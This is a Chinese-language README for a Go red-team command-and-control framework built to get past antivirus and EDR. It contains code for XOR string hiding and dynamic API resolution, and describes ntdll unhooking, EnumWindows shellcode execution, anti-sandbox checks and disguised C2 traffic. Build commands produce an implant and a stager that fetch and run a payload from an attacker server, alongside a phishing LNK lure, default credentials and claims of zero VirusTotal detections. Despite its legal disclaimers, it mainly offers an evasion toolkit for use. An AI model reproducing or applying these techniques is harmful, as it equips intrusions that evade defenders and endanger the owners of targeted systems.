# Nautilus C2 — 从0到0/60 VT免杀的红队C2框架

> **⚠️ 法律声明：本项目仅供授权安全测试和教育研究使用。未经授权对任何系统使用本工具属于违法行为。使用者须确保在合法授权范围内操作，并遵守当地法律法规。项目作者不对任何非法使用行为承担责任。**

## 命名灵感

**Nautilus**（鹦鹉螺）——深海中的精密工程奇迹。其独特的喷水推进机制隐喻植入体的C2回连通信，精密的螺旋外壳象征多层加密与通信伪装。如同鹦鹉螺在深海中无声航行，Nautilus 植入体在目标网络中静默潜伏，通过远程遥控执行任务。

## 项目概述

Nautilus 是一个从零构建的轻量级红队 C2（Command & Control）框架，采用 Go 语言编写，涵盖服务端、植入体、分阶段加载器三个核心组件。项目的核心目标是：**在不依赖商业工具的前提下，实现前沿 C2 的核心能力，并达到主流杀软 0 检出**。

### 架构

```
┌─────────────────────────────────────────────────┐
│  VPS / 攻击者机器                                │
│  ┌───────────────────────────────────────┐      │
│  │  nautilus-server (:8443)              │      │
│  │  ├─ Web UI (/ui)                      │      │
│  │  ├─ WebSocket 实时推送                 │      │
│  │  ├─ 认证登录 (HMAC-SHA256)            │      │
│  │  └─ 任务管理 API                       │      │
│  └───────────────────────────────────────┘      │
└─────────────────────────────────────────────────┘
        ↑ AES-GCM加密通信 (伪装为前端埋点API)
        ↓ /api/v1/analytics?id=<encrypted>&sid=<session>
┌─────────────────────────────────────────────────┐
│  目标机器                                        │
│  ┌───────────────┐  ┌───────────────────┐      │
│  │  LNK快捷方式   │→ │  stager.exe       │      │
│  │  (钓鱼诱饵)    │  │  (分阶段加载器)    │      │
│  └───────────────┘  │  ↓ XOR解密+内存执行│      │
│                     │  nautilus payload  │      │
│                     └───────────────────┘      │
└─────────────────────────────────────────────────┘
```

## 免杀技术详解

### 1. 字符串清零：消除静态指纹

杀软静态扫描的核心依赖是**字符串特征匹配**。YARA规则通过搜索敏感API名（如`VirtualAlloc`、`CreateRemoteThread`）、DLL名（如`ntdll.dll`）、C2协议关键字来识别恶意软件。

Nautilus 采用**编译期 XOR 加密 + 运行时解密**的方式彻底消除静态字符串：

```go
// 源码中只存储XOR加密的字节数组
var encNtDll  = []byte{0x59, 0x43, 0x53, 0x5b, 0x5b, 0x19, 0x53, 0x5b, 0x5b}
// 运行时解密: "ntdll.dll"
func xorDec(data []byte, key byte) string {
    out := make([]byte, len(data))
    for i, b := range data {
        out[i] = b ^ key
    }
    return string(out)
}
```

**覆盖范围**：所有 DLL名、API名、文件路径（如`C:\Windows\System32\ntdll.dll`）均被 XOR 加密。杀软扫描二进制时找不到任何敏感字符串。

**为什么不用 garble？** 我们测试发现 garble 的 `-tiny -literals` 混淆会重组 PE 结构，反而触发 ClamAV 的 Sliver 签名（详见下文"反模式"章节）。

### 2. API动态解析：绕过IAT挂钩

EDR 产品通过在进程的 IAT（Import Address Table）中挂钩敏感 API 来监控行为。传统恶意软件在 IAT 中显式导入 `VirtualAllocEx`、`WriteProcessMemory` 等函数，直接被拦截。

Nautilus 使用 `syscall.NewLazyDLL` + XOR加密的DLL/API名实现**运行时动态解析**：

```go
// 传统方式（会被EDR挂钩）:
// mod := syscall.NewLazyDLL("ntdll.dll")
// proc := mod.NewProc("NtAllocateVirtualMemory")

// Nautilus方式（XOR加密 + 运行时解析）:
func ntProc(encName []byte) *syscall.LazyProc {
    return syscall.NewLazyDLL(xorDec(encNtDll, xk)).NewProc(xorDec(encName, xk))
}
```

**效果**：IAT中不出现任何敏感API名，EDR的IAT挂钩失效。

### 3. Ntdll Unhooking：脱掉EDR的监控

即使绕过了IAT挂钩，EDR仍然会在 `ntdll.dll` 的 `.text` 段中插入 **int3 断点（inline hook）** 来监控底层API调用。

Nautilus 实现了完整的 **ntdll unhooking**：

1. 从磁盘读取干净的 `C:\Windows\System32\ntdll.dll`
2. 在内存中定位当前加载的 ntdll `.text` 段
3. 使用 `NtProtectVirtualMemory` 将 `.text` 段改为 RW 权限
4. 使用 `RtlCopyMemory` 将干净的 `.text` 段覆盖到内存
5. 恢复原始权限

**关键细节**：所有API名（`NtProtectVirtualMemory`、`RtlCopyMemory`）本身也是 XOR 加密的，形成自洽的闭环——unhooking 操作本身不会被 hook 检测到。

### 4. 回调执行：替代直接的 syscall 调用

杀软通过监控 `syscall.SyscallN` 的调用模式来识别 shellcode 执行。Nautilus 使用 **EnumWindows 回调** 方式执行 shellcode：

```go
// 传统方式（被监控）:
// syscall.SyscallN(shellcodeAddr, ...)

// Nautilus方式（回调执行）:
CallEnumWindows(shellcodeAddr, 0)
// 或 EnumChildWindows 回调
```

**原理**：`EnumWindows` 是合法的 Win32 API，接收一个回调函数指针。Nautilus 将 shellcode 地址作为回调传入，操作系统在枚举窗口时自然执行 shellcode。这种方式完全绕过了 syscall 监控。

### 5. 反沙箱检测：避免在分析环境中暴露

沙箱（如 Cuckoo、Any.Run）是杀软动态分析的核心。Nautilus 实现了多重反沙箱：

| 检测项 | 条件 | 说明 |
|--------|------|------|
| 物理内存 | < 2GB | 沙箱通常分配少量内存 |
| CPU核心数 | < 2 | 沙箱通常单核 |
| 系统运行时间 | < 10分钟 | 沙箱刚启动即执行样本 |
| 用户名 | "user" / "sand" | 沙箱常用默认用户名 |
| 调试器检测 | `IsDebuggerPresent` | 检测调试器附加 |

所有检测API同样经过 XOR 加密，沙箱的字符串扫描无法识别这些反检测逻辑。

### 6. 通信伪装：融入正常流量

C2 通信是杀软网络检测的重点。Nautilus 的 HTTP 通信伪装为**前端埋点数据上报**：

```
GET /api/v1/analytics?id=<AES-GCM加密的base64数据>&sid=<sessionID>
Headers:
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0
  Accept: application/json, text/plain, */*
  Origin: http://localhost
```

**特征**：
- 路径看起来是正常的数据分析API
- URL参数名 `id` 和 `sid` 无特殊含义
- 完整的浏览器请求头
- AES-GCM 加密 + base64 编码，数据段看起来像正常埋点参数

### 7. PE结构后处理：破坏Go二进制指纹

Go 编译的二进制有独特的 PE 结构特征：
- 固定的 section 名：`.text`、`.rdata`、`.data`、`.pdata`、`.rsrc`、`.reloc`
- Go 专有 section：`.gosymtab`、`.gopclntab`、`.go.buildinfo`
- 固定的 PE 时间戳（Go 编译器行为）
- Rich Header 信息

Nautilus 的后处理工具链：

| 工具 | 操作 | 目的 |
|------|------|------|
| `pesectionobf` | 重命名PE section | 破坏Go二进制结构指纹，`.text` → `.code` |
| `pepatch` | 修改PE时间戳 | 破坏基于时间戳的家族分类 |
| `AppendOverlayData` | 附加随机数据 | 改变文件哈希，避免哈希比对 |
| 字符串清零 | XOR加密所有敏感字符串 | 破坏YARA字符串规则匹配 |

### 8. 分阶段加载：最小化初始投递体积

直接投递完整植入体风险较大。Nautilus 采用分阶段加载：

**Stager（第一阶段）**：
- 极小的加载器（~2MB）
- 仅包含反沙箱 + 下载 + XOR解密 + 内存执行
- 所有API名XOR加密
- EnumWindows回调执行shellcode
- **VT检测结果：0/58**

**Payload（第二阶段）**：
- 从C2远程下载，XOR加密传输
- 内存中解密执行，不写入磁盘（不落地）
- 完整C2功能（命令执行、文件管理、进程操作等）

### 反模式：什么不该做

在实际测试中，我们发现了几个**适得其反**的免杀方法：

| 方法 | 问题 | VT检出 |
|------|------|--------|
| garble `-tiny -literals` | 重组PE结构，触发ClamAV的Sliver签名 | 3/60 |
| 修改PE section名为随机字符串 | 触发Microsoft ML模型标记为`Wacatac.B!ml` | 1/60 |
| UPX压缩 | 被多个引擎标记为压缩恶意软件 | 5/60 |
| 注入无关代码增加熵值 | 增加PE熵值反而触发熵值异常检测 | 2/60 |

**核心教训**：免杀不是"越复杂越好"，而是"越干净越好"。一个没有可疑特征的标准PE文件，比一个经过大量修改的异常PE文件更容易通过检测。

## 免杀验证结果

### VirusTotal — 0/60 检出

| 引擎 | 结果 | 引擎 | 结果 |
|------|------|------|------|
| Microsoft Defender | CLEAN | ClamAV | CLEAN |
| Kaspersky | CLEAN | BitDefender | CLEAN |
| ESET-NOD32 | CLEAN | Symantec | CLEAN |
| CrowdStrike | CLEAN | TrendMicro | CLEAN |
| Sophos | CLEAN | McAfee | CLEAN |
| Avast | CLEAN | AVG | CLEAN |
| Malwarebytes | CLEAN | Google | CLEAN |
| 火绒 (huorong) | CLEAN | 腾讯 (Tencent) | CLEAN |
| 金山 (Kingsoft) | CLEAN | 瑞星 (Rising) | CLEAN |
| 阿里巴巴 | CLEAN | Avira | CLEAN |
| F-Secure | CLEAN | Fortinet | CLEAN |
| DrWeb | CLEAN | Emsisoft | CLEAN |
| 其余38个引擎 | CLEAN | | |

**VT报告**: https://www.virustotal.com/gui/file/ea99c487a8342f84c4222a4518f188a79d4943efbc9aa0b57e07fb16e10f85e7

## 功能对比

| 功能 | Nautilus | Havoc | Cobalt Strike | Mythic |
|------|----------|-------|---------------|--------|
| Web UI | 内嵌HTML | Qt桌面客户端 | Java桌面 | React Web |
| 认证登录 | HMAC-SHA256 token | 用户密码 | 多用户RBAC | 多用户RBAC |
| WebSocket实时推送 | 有 | 无 | 无 | 有 |
| 加密通信 | AES-GCM | AES-256-CTR | RSA+AES | 可配置 |
| 反沙箱 | 多维度检测 | 有 | 有 | 无 |
| Ntdll Unhooking | 有 | 有 | 有(sleep mask) | 无 |
| API动态解析 | XOR加密 | 有 | 有 | 无 |
| 回调执行 | EnumWindows | 有 | 有 | 无 |
| PE结构混淆 | Section名+时间戳 | 无 | 无 | 无 |
| 文件管理 | 浏览+上传+下载 | 全功能浏览器 | 全功能 | 全功能 |
| 进程管理 | 列表+终止 | 全功能+注入 | 全功能 | 全功能 |
| VT免杀 | 0/60 | 需配置 | 商业级 | 需配置 |

## 技术栈

| 组件 | 语言 | 关键技术 |
|------|------|---------|
| Server | Go | HTTP服务器、WebSocket、embed.FS、JSON API |
| Implant | Go | syscall动态解析、AES-GCM、XOR字符串加密 |
| Stager | Go | EnumWindows回调、XOR shellcode解密、反沙箱 |
| PE工具 | Go | 二进制PE解析、section重命名、时间戳修改 |
| Web UI | HTML/CSS/JS | 单文件内嵌、WebSocket实时、暗色主题 |

## 项目结构

```
nautilus/
├── main.go                 # 植入体入口
├── server/
│   ├── main.go             # C2服务端（HTTP+WebSocket）
│   ├── ui.go               # Web UI API处理器
│   └── web/
│       └── index.html      # 内嵌Web UI页面
├── c2/
│   ├── encode/
│   │   └── packet.go       # 通信协议编码/解码
│   └── transport/
│       └── http.go          # HTTP传输层（伪装埋点API）
├── core/
│   ├── exec.go             # 命令执行
│   ├── fs.go               # 文件操作
│   ├── process.go          # 进程管理
│   ├── privilege.go        # 权限信息
│   ├── sysinfo.go          # 系统信息
│   └── shellcode_windows.go # Shellcode处理
├── evasion/
│   ├── crypto.go           # AES-GCM加密/解密、Base64
│   ├── apiresolve_windows.go # XOR加密API动态解析
│   ├── unhook_windows.go   # Ntdll unhooking
│   ├── sandbox.go          # 反沙箱检测
│   └── pe.go               # PE结构修改工具
├── stager/
│   └── main_windows.go     # 分阶段加载器
└── evasion-tools/
    ├── pepatch.go           # PE时间戳修改
    └── pesectionobf.go     # PE Section名混淆
```

## 快速开始

### 编译服务端

```bash
go build -buildvcs=false -o nautilus-server ./server
```

### 编译植入体

```bash
# 编译植入体（指定C2地址）
go build -buildvcs=false -ldflags="-X main.c2Addr=http://YOUR_VPS:8443" -o nautilus-implant .

# PE后处理（免杀关键步骤）
go run ./evasion-tools/pesectionobf.go nautilus-implant   # 重命名PE section
go run ./evasion-tools/pepatch.go nautilus-implant        # 修改时间戳
# 附加随机overlay数据改变哈希
```

### 编译Stager

```bash
go build -buildvcs=false -ldflags="-X main.downloadURL=http://YOUR_VPS:8443/payload -X main.decryptKeyStr=85" -o stager.exe ./stager
go run ./evasion-tools/pesectionobf.go stager.exe
go run ./evasion-tools/pepatch.go stager.exe
```

### 启动

```bash
# VPS上启动服务端
./nautilus-server

# 浏览器访问Web UI
http://YOUR_VPS:8443/ui
# 默认登录: nautilus / nautilus2026

# 目标机器运行植入体
./nautilus-implant
```

## GitHub

仓库地址: https://github.com/nk7667/Nautilus

```bash
git clone git@github.com:nk7667/Nautilus.git
cd Nautilus
```

## 法律与道德声明

**本项目严格遵循以下原则：**

1. **仅用于授权安全测试** — 所有使用必须在获得书面授权的前提下进行
2. **教育研究目的** — 项目代码公开是为了安全研究和学习，不是攻击工具
3. **使用者责任** — 任何非法使用本工具的行为，责任由使用者自行承担
4. **禁止恶意使用** — 未经授权对任何系统部署植入体、窃取数据、破坏服务属于犯罪行为

**参考同类开源项目的法律实践：**

- Havoc Framework (GPL-3.0): "designed for red teamers who needed advanced capabilities"
- Covenant (GPL-3.0): "highlight the attack surface of .NET, serve as a collaborative C2 platform for red teamers"
- Sliver (GPL-3.0): BishopFox 开源，明确标注 "post-exploitation framework for red teamers"
- Mythic (MIT): "for authorized penetration testing and red teaming"

这些项目均在 GitHub 上公开，采用明确的免责声明和开源许可证。Nautilus C2 同样遵循这一实践。

## 许可证

MIT License — 详见 [LICENSE](LICENSE)

```
MIT License

Copyright (c) 2026 Nautilus C2

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

IMPORTANT: This software is intended for authorized security testing and
educational purposes only. Unauthorized use of this software against any
system without explicit written permission is illegal. The authors assume
no liability for any misuse of this software.
```
